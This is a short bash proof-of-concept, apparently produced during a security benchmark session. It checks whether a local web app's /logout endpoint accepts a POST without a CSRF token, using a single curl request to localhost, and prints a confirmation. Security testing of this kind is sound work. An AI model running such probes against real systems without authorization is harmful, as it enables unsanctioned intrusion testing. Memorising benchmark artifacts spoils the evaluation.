#!/bin/bash
# POC: Bash script that verifies the CSRF vulnerability on the /logout endpoint by sending a POST request without a CSRF token and confirming the logout action is processed.
# Target: ./repo
# Created: 2025-11-07T16:37:22.823Z
# Session: benchmark-XBEN-001-24-mhp2ljz1

# CSRF Vulnerability on Logout Endpoint POC
# This script demonstrates that the /logout endpoint accepts POST requests
# without CSRF token validation, allowing cross-site request forgery attacks

TARGET_URL="http://localhost:8082"
LOGOUT_ENDPOINT="/logout"

echo "=== CSRF Vulnerability on Logout Endpoint POC ==="
echo ""

# Step 1: Attempt to access logout endpoint with POST request (no CSRF token)
echo "[*] Step 1: Testing logout endpoint for CSRF vulnerability"
echo "[*] Target: ${TARGET_URL}${LOGOUT_ENDPOINT}"
echo "[*] Method: POST (without CSRF token)"
echo ""

# Make a POST request to logout without any CSRF token
RESPONSE=$(curl -s -i -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  "${TARGET_URL}${LOGOUT_ENDPOINT}" 2>&1)

echo "[+] Response received:"
echo "$RESPONSE"
echo ""

# Check if the response contains a redirect (HTTP 302/303) indicating logout was processed
if echo "$RESPONSE" | grep -q "302\|303\|301"; then
    echo "[✓] VULNERABILITY CONFIRMED: Logout endpoint accepted POST request without CSRF token"
    echo "[✓] Response indicates redirect (likely to login page)"
    echo ""
    echo "[!] This demonstrates that:"
    echo "    - The logout endpoint accepts POST requests without CSRF protection"
    echo "    - An attacker could force logout by embedding a hidden form on a malicious page"
    echo "    - No CSRF token is required to perform this action"
    exit 0
else
    echo "[-] Unexpected response format"
    exit 1
fi